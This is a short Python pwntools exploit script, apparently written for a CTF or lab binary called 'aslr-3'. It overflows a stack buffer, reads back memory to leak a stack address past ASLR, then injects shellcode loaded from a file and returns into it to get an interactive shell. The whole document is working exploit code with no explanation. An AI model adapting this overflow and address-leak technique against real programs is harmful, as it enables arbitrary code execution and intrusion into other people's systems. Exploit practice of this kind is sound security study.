#!/usr/bin/env python

import re

from pwn import *

f = open("shellcode.bin", "r")
shellcode = f.read().strip()
f.close()

p = process('./aslr-3')

addr_input = 0x08048533
buffe = "A"*140 + p32(addr_input)
p.sendline(buffe)

# read 256 bytes
print(p.recvuntil('print?\n'))

p.sendline('256')


data = p.recv(0x200)

raw_data = data[144:-8]

leak_addrs = [u32(raw_data[i:i+4]) for i in xrange(0, len(raw_data), 4)]
leak_st_off = leak_addrs[1]-0xb0
print(hex(leak_st_off))

buffe2 = shellcode + "A"*(140-36) + p32(leak_st_off)
p.sendline(buffe2)
p.interactive()

